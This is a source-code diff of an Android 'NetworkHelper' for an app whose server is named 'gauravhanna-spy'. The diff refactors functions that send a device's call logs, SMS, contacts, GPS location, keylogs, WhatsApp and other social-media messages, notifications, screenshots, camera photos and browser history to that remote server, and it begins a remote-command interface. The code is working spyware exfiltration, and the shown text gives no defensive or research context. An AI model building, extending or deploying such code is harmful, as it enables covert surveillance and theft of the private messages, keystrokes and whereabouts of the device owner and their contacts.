@@ -4,6 +4,7 @@ import android.content.Context
 import android.util.Log
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.IOException
@@ -11,7 +12,7 @@ import java.util.concurrent.TimeUnit
 
 object NetworkHelper {
     private const val TAG = "NetworkHelper"
-    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api"
+    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api/client"
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -30,21 +31,20 @@ object NetworkHelper {
     }
 
     // ========== DEVICE REGISTRATION ==========
-
-    fun registerDevice(context: Context, deviceId: String, deviceName: String, model: String, androidVersion: String, userId: String) {
+    fun registerDevice(context: Context, deviceId: String, deviceName: String, model: String, androidVersion: String, userId: String? = null) {
         val json = JSONObject().apply {
             put("deviceId", deviceId)
             put("deviceName", deviceName)
             put("deviceModel", model)
             put("androidVersion", androidVersion)
-            put("userId", userId)
+            if (userId != null && userId.isNotEmpty()) {
+                put("userId", userId)
+            }
         }
-
         val request = Request.Builder()
             .url("$BASE_URL/register")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
-
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "Register failed: ${e.message}")
@@ -53,6 +53,8 @@ object NetworkHelper {
                 if (response.isSuccessful) {
                     setDeviceId(context, deviceId)
                     Log.d(TAG, "✅ Device registered")
+                } else {
+                    Log.e(TAG, "Register HTTP ${response.code}")
                 }
                 response.close()
             }
@@ -60,7 +62,6 @@ object NetworkHelper {
     }
 
     // ========== CALLS ==========
-
     fun sendCalls(context: Context, calls: List<DataCollector.CallLogEntry>) {
         val deviceId = getDeviceId(context) ?: return
         val arr = JSONArray()
@@ -79,20 +80,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/calls")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), body.toString()))
+            .post(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendCalls failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Calls sent")
+                else Log.e(TAG, "sendCalls HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== SMS ==========
-
     fun sendSMS(context: Context, smsList: List<DataCollector.SmsEntry>) {
         val deviceId = getDeviceId(context) ?: return
         val arr = JSONArray()
@@ -110,20 +112,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/messages")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), body.toString()))
+            .post(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendSMS failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ SMS sent")
+                else Log.e(TAG, "sendSMS HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== CONTACTS ==========
-
     fun sendContacts(context: Context, contacts: List<DataCollector.ContactEntry>) {
         val deviceId = getDeviceId(context) ?: return
         val arr = JSONArray()
@@ -139,20 +142,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/contacts")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), body.toString()))
+            .post(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendContacts failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Contacts sent")
+                else Log.e(TAG, "sendContacts HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== LOCATION ==========
-
     fun sendLocation(context: Context, lat: Double, lng: Double, speed: Float, address: String?) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
@@ -165,20 +169,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/location")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendLocation failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Location sent")
+                else Log.e(TAG, "sendLocation HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== KEYLOG ==========
-
     fun sendKeylog(context: Context, appPackage: String, text: String) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
@@ -188,77 +193,78 @@ object NetworkHelper {
             put("timestamp", System.currentTimeMillis())
         }
         val request = Request.Builder()
-            .url("$BASE_URL/keylog")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .url("$BASE_URL/keylogs")
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendKeylog failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Keylog sent")
+                else Log.e(TAG, "sendKeylog HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== APP USAGE ==========
-
-    fun sendAppUsage(context: Context, entry: Map<String, Any>) {
+    fun sendAppUsage(context: Context, appPackage: String, appName: String, foregroundTime: Int, timestamp: Long) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
             put("deviceId", deviceId)
-            put("appPackage", entry["appPackage"])
-            put("appName", entry["appName"])
-            put("foregroundTime", entry["foregroundTime"])
-            put("timestamp", entry["timestamp"])
+            put("appPackage", appPackage)
+            put("appName", appName)
+            put("foregroundTime", foregroundTime)
+            put("timestamp", timestamp)
         }
         val request = Request.Builder()
             .url("$BASE_URL/app-usage")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendAppUsage failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ App usage sent")
+                else Log.e(TAG, "sendAppUsage HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
-    // ========== SOCIAL MESSAGES (WhatsApp, Instagram, Facebook, Telegram, Messenger) ==========
-
+    // ========== SOCIAL MESSAGES ==========
     fun sendSocialMessage(context: Context, appName: String, sender: String, message: String, timestamp: Long) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
             put("deviceId", deviceId)
             put("app", appName)
-            put("sender", sender)
+            put("contactName", sender)
             put("message", message)
             put("timestamp", timestamp)
             put("isIncoming", true)
         }
         val request = Request.Builder()
-            .url("$BASE_URL/social-messages")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .url("$BASE_URL/messages")
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendSocialMessage failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
-                Log.d(TAG, "✅ Social message sent: $appName from $sender")
+                if (response.isSuccessful) Log.d(TAG, "✅ Social message sent: $appName from $sender")
+                else Log.e(TAG, "sendSocialMessage HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
-    // ========== NOTIFICATION MESSAGES (All Apps) ==========
-
+    // ========== NOTIFICATION MESSAGES ==========
     fun sendNotificationMessage(context: Context, packageName: String, title: String, message: String, timestamp: Long) {
         val deviceId = getDeviceId(context) ?: return
 
-        // Detect app name
         val appName = when {
             packageName.contains("whatsapp", ignoreCase = true) -> "whatsapp"
             packageName.contains("instagram", ignoreCase = true) -> "instagram"
@@ -281,31 +287,28 @@ object NetworkHelper {
         val json = JSONObject().apply {
             put("deviceId", deviceId)
             put("app", appName)
-            put("packageName", packageName)
-            put("title", title)
+            put("contactName", title.ifEmpty { "Unknown" })
             put("message", message)
             put("timestamp", timestamp)
             put("isIncoming", true)
         }
-
         val request = Request.Builder()
-            .url("$BASE_URL/notifications")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .url("$BASE_URL/messages")
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
-
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendNotificationMessage failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
-                Log.d(TAG, "✅ Notification sent: $appName")
+                if (response.isSuccessful) Log.d(TAG, "✅ Notification message sent: $appName")
+                else Log.e(TAG, "sendNotificationMessage HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== SCREENSHOTS ==========
-
     fun sendScreenshot(context: Context, imageBase64: String) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
@@ -315,20 +318,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/screenshot")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendScreenshot failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Screenshot sent")
+                else Log.e(TAG, "sendScreenshot HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
-    // ========== PHOTO (Camera) ==========
-
+    // ========== PHOTO ==========
     fun sendPhoto(context: Context, imageBase64: String) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
@@ -338,20 +342,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/photo")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendPhoto failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Photo sent")
+                else Log.e(TAG, "sendPhoto HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== BROWSER HISTORY ==========
-
     fun sendBrowserHistory(context: Context, title: String, url: String, timestamp: Long) {
         val deviceId = getDeviceId(context) ?: return
         val json = JSONObject().apply {
@@ -362,20 +367,21 @@ object NetworkHelper {
         }
         val request = Request.Builder()
             .url("$BASE_URL/browser-history")
-            .post(RequestBody.create("application/json".toMediaTypeOrNull(), json.toString()))
+            .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull()))
             .build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "sendBrowserHistory failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) Log.d(TAG, "✅ Browser history sent")
+                else Log.e(TAG, "sendBrowserHistory HTTP ${response.code}")
                 response.close()
             }
         })
     }
 
     // ========== COMMANDS ==========
-
     interface CommandCallback {
         fun onCommand(command: String)
     }
